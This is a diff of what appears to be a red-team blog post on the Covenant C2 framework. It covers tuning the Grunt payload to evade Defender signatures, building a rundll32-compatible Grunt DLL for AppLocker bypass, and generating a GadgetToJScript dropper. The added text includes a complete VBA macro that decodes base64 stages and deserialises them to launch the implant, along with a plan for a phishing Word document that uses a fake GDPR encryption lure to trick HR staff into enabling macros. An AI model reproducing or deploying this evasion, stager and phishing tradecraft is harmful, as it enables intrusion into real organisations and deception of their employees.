@@ -200,8 +200,8 @@ From a default Covenant installation we can generate a standard binary Grunt the
   <img src="/assets/posts/2021-07-01-Entering-the-Covenant-C2C/cov1.JPG">
 </p>
 
-ThreatCheck dumps a `256-byte` hex view up from the end of the offending bytes, so the “interesting” bytes are always at the bottom. 
-In any case, we see here the connect address for the listener, followed by the base64 encoded string VXNlci1BZ2VudA== with is User-Agent.
+__ThreatCheck__ dumps a `256-byte` hex view up from the end of the offending bytes, so the “interesting” bytes are always at the bottom. 
+In any case, we see here the connect address for the listener, followed by the base64 encoded string `VXNlci1BZ2VudA==` with is `User-Agent`.
 
 These request headers are part of the default traffic profile used by the default listener. 
 However if we go into the profile editor, we’re free to add, remove, change these as we see fit. An example follow below:
@@ -216,8 +216,8 @@ However if we go into the profile editor, we’re free to add, remove, change th
 - Modified User-Agent String
 
 
-Now when we regenerate the __Binary__ __Launcher__ and scan it with ThreatCheck, that particular detection is gone, but we get another one. 
-ThreatCheck will only show one detection at a time, so this is certainly an iterative process. 
+Now when we regenerate the __Binary__ __Launcher__ and scan it with __ThreatCheck__, that particular detection is gone, but we get another one. 
+__ThreatCheck__ will only show one detection at a time, so this is certainly an iterative process. 
 You obviously need to reiterate this process few times in order to find  all the malicious bytes the flag the Defender's signature.  
 
 
@@ -225,9 +225,9 @@ You obviously need to reiterate this process few times in order to find  all the
 
 ### 3) Grunt DLL with rundll32 - AvBypass
 
-From Covenant we can create a Grunt DLL that has an export compatible with rundll32. 
+From __Covenant__ we can create a __Grunt__ DLL that has an export compatible with rundll32. 
 
-- In Covenant, select the Binary Launcher and Generate a new __Grunt__. Then click the Code tab and copy the __StagerCode__.
+- In __Covenant__, select the Binary Launcher and Generate a new __Grunt__. Then click the Code tab and copy the __StagerCode__.
 
 - Open Visual Studio and create a new __Class__ __Library__ __(.NET __Framework)__ project. Delete everything in Class1.cs and paste the __StagerCode__.
 
@@ -252,7 +252,7 @@ public class Exports
 
 - Add using statements for __System.Runtime.InteropServices__ and __RGiesecke.DllExport__. 
 
-- Open the __Configuration__ __Manager__ and create a New Solution Platform for __x64__ (and x86 if you require).
+- Open the __Configuration__ __Manager__ and create a "New Solution Platform for __x64__" (and x86 if you require).
 
 Now build the project then copy the DLL to the target machine and execute with __rundll32__ as follow
 
@@ -260,7 +260,7 @@ Now build the project then copy the DLL to the target machine and execute with _
 rundll32 covenant-DLL-noAmsi.dll,MonkEntry
 ```
 
-Now you should have your Grunt checking in on Covenant.
+Now you should have your __Grunt__ checking in on __Covenant__.
 
 <p align="center">
   <img src="/assets/posts/2021-07-01-Entering-the-Covenant-C2C/cov3.JPG">
@@ -284,7 +284,7 @@ PS > [MonkStager.MonkStager]::Execute()
   <img src="/assets/posts/2021-07-01-Entering-the-Covenant-C2C/cov4.JPG">
 </p>
 
-And note your new powershell Grunt checking in on Covenant.
+And note your new powershell __Grunt__ checking in on __Covenant__.
 
 
 <p align="center">
@@ -300,14 +300,16 @@ PS > [System.Reflection.Assembly]::Load($dll)
 PS > [MonkStager.MonkStager]::Execute()
 ```
 
-This DLL technique can be particulary useful when dealing with AppLocker bypass as it is common occurrence that the DLL AppLocker rules are not enabled or enforced 🚩.
+This DLL technique can be particulary useful when dealing with __AppLocker__ bypass as it is common occurrence that the DLL __AppLocker__ rules are not enabled or enforced 🚩.
 
 ### 4) Initial delivery 
 
 We can try to simulate a campaign conducted by foreign APT adversaries. We will try to leverage the amazing [GadgetToJScript:](https://github.com/med0x2e/GadgetToJScript) project to weaponize our custom .NET assembly.
+Our DLL is not perfect, but it works. However, it's quite hard to deliver one to a target user since no default actions are associated with that file type (double clicking it doesn't do much!). Not to mention that most corporate web proxies and mail filters block the DLL file type regardless of being malicious or benign! What is needed is an additional component that will write our DLL on disk and then load it to trigger the execution. 
+Javascript format was chosen for this example task, but the same concept could be applied with other languages such as VBS and VBA, commonly used for initial access as well since they can be saved as office enable macro document.
 
 
-First of all we need to build GadgetToJScript in __VisualStudio__. Once the GadgetToJScript binary has been build we can launch the program to generate a malicious __.js__ file that will spawn our custom Covenant Grunt.
+First of all we need to build __GadgetToJScript__ in __VisualStudio__. Once the __GadgetToJScript__ binary has been build we can launch the program to generate a malicious __.js__ file that will spawn our custom __Covenant__ __Grunt__.
 
 The code is illustrate below: 
 
@@ -331,10 +333,116 @@ Once we have our malicious __.js__ file we can execute the file using the Window
   <img src="/assets/posts/2021-07-01-Entering-the-Covenant-C2C/cov7.JPG">
 </p>
 
-If everything went file you should now have your new cscript Grunt checking in on Covenant.
+If everything went file you should now have your new cscript __Grunt__ checking in on __Covenant__.
 
 <p align="center">
   <img src="/assets/posts/2021-07-01-Entering-the-Covenant-C2C/cov8.JPG">
 </p>
  
-__Note:__ Please note that we can still generate our malicious vba script to be stored inside a office enable macro document.🚩
+__Note:__ Please note that we can still generate our malicious vba script to be stored inside a office enable macro document as follow below 🚩
+
+<p align="center">
+  <img src="/assets/posts/2021-07-01-Entering-the-Covenant-C2C/cov9.JPG">
+</p>
+
+
+This will generate the following VBA code: 
+
+```vba
+Function b64Decode(ByVal enc)
+    Dim xmlObj, nodeObj
+    Set xmlObj = CreateObject("Msxml2.DOMDocument.3.0")
+    Set nodeObj = xmlObj.CreateElement("base64")
+    nodeObj.dataType = "bin.base64"
+    nodeObj.Text = enc
+    b64Decode = nodeObj.nodeTypedValue
+    Set nodeObj = Nothing
+    Set xmlObj = Nothing
+End Function
+
+Function Exec()
+    
+	Dim stage_1, stage_2
+
+    stage_1 = "AAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVy"
+stage_1 = stage_1 & "ZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0"
+stage_1 = stage_1 & "LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAxxA8UmVz"
+stage_1 = stage_1 & "b3VyY2VEaWN0aW9uYXJ5DQogICAgICAgICAgICB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2"
+stage_1 = stage_1 & "cmFtZXRlcnM+DQogICAgICAgICAgICAgICAgICAgICAgICA8czpTdHJpbmc+bWljcm9zb2Z0OldvcmtmbG93Q29tcG9uZW50TW9k"
+stage_1 = stage_1 & "ZWw6RGlzYWJsZUFjdGl2aXR5U3Vycm9nYXRlU2VsZWN0b3JUeXBlQ2hlY2s8L3M6U3RyaW5nPg0KICAgICAgICAgICAgICAgICAg"
+stage_1 = stage_1 & "ICAgICAgPHM6U3RyaW5nPnRydWU8L3M6U3RyaW5nPg0KICAgICAgICAgICAgICAgICAgICA8L09iamVjdERhdGFQcm92aWRlci5N"
+stage_1 = stage_1 & "ZXRob2RQYXJhbWV0ZXJzPg0KICAgICAgICAgICAgICAgIDwvT2JqZWN0RGF0YVByb3ZpZGVyPg0KICAgICAgICAgICAgPC9SZXNv"
+stage_1 = stage_1 & "dXJjZURpY3Rpb25hcnk+Cw=="
+
+    
+stage_2 = "AAEAAAD/////AQAAAAAAAAAMAgAAAFdTeXN0ZW0uV2luZG93cy5Gb3JtcywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRy"
+stage_2 = stage_2 & "YWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAACFTeXN0ZW0uV2luZG93cy5Gb3Jtcy5BeEhvc3QrU3RhdGUB"
+stage_2 = stage_2 & "AAAAEVByb3BlcnR5QmFnQmluYXJ5BwICAAAACQMAAAAPAwAAAMd7AAACAAEAAAD/////AQAAAAAAAAAEAQAAAH9TeXN0ZW0uQ29s"
+stage_2 = stage_2 & "bGVjdGlvbnMuR2VuZXJpYy5MaXN0YDFbW1N5c3RlbS5PYmplY3QsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9"
+stage_2 = stage_2 & "bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dAwAAAAZfaXRlbXMFX3NpemUIX3ZlcnNpb24FAAAICAkC"
+stage_2 = stage_2 & "AAAACgAAAAoAAAAQAgAAABAAAAAJAwAAAAkEAAAACQUAAAAJBgAAAAkHAAAACQgAAAAJCQAAAAkKAAAACQsAAAAJDAAAAA0GBwMA"
+stage_2 = stage_2 & "dWlkCwAAAAJfYQJfYgJfYwJfZAJfZQJfZgJfZwJfaAJfaQJfagJfawAAAAAAAAAAAAAACAcHAgICAgICAgITE9J07irREYv7AKDJ"
+stage_2 = stage_2 & "Dyb3Cws="
+
+
+    Dim stm_1 As Object, fmt_1 As Object
+    
+    manifest = "<?xml version=""1.0"" encoding=""UTF-16"" standalone=""yes""?>"
+	manifest = manifest & "<assembly xmlns=""urn:schemas-microsoft-com:asm.v1"" manifestVersion=""1.0"">"
+	manifest = manifest & "<assemblyIdentity name=""mscorlib"" version=""4.0.0.0"" publicKeyToken=""B77A5C561934E089"" />"
+	manifest = manifest & "<clrClass clsid=""{D0CBA7AF-93F5-378A-BB11-2A5D9AA9C4D7}"" progid=""System.Runtime.Serialization"
+	manifest = manifest & ".Formatters.Binary.BinaryFormatter"" threadingModel=""Both"" name=""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"" "
+	manifest = manifest & "runtimeVersion=""v4.0.30319"" /><clrClass clsid=""{8D907846-455E-39A7-BD31-BC9F81468B47}"" "
+	manifest = manifest & "progid=""System.IO.MemoryStream"" threadingModel=""Both"" name=""System.IO.MemoryStream"" runtimeVersion=""v4.0.30319"" /></assembly>"
+
+
+    Set actCtx = CreateObject("Microsoft.Windows.ActCtx")
+    actCtx.ManifestText = manifest
+        
+    Set stm_1 = actCtx.CreateObject("System.IO.MemoryStream")
+    Set fmt_1 = actCtx.CreateObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")
+
+    Dim Decstage_1
+    Decstage_1 = b64Decode(stage_1)
+
+    For Each i In Decstage_1
+        stm_1.WriteByte i
+    Next i
+
+    On Error Resume Next
+
+    stm_1.Position = 0
+    Dim o1 As Object
+    Set o1 = fmt_1.Deserialize_2(stm_1)
+
+    If Err.Number <> 0 Then
+       Dim stm_2 As Object
+       
+       Set stm_2 = actCtx.CreateObject("System.IO.MemoryStream")
+
+       Dim Decstage_2
+       Decstage_2 = b64Decode(stage_2)
+
+       For Each j In Decstage_2
+        stm_2.WriteByte j
+       Next j
+
+       stm_2.Position = 0
+       Dim o2 As Object
+       Set o2 = fmt_1.Deserialize_2(stm_2)
+    End If
+
+End Function
+```
+
+Furthermore, we can now craft our dedicated word/excel document to be used during our simulated phishing campaign. Bear in mind the this is a huge part as a Red Team Operator
+considering the user's training and the security monitoring deployed across the perimeter of the enterprise network. Sometimes, HR office can be a good candidate for 
+phishing document since they need to open and access possible employeer curriculum. In the following scenario we will present a custom word with a "fake" encryption aplied to the document.
+Leveraging GDPR principles we will try to encrypt our document and force the HR individual to click to "Enable content" button.   
+
+Below the custom word document that we will deliver to the HR office as part of our phishing campaing
+
+<p align="center">
+  <img src="/assets/posts/2021-07-01-Entering-the-Covenant-C2C/cov10.JPG">
+</p>
+
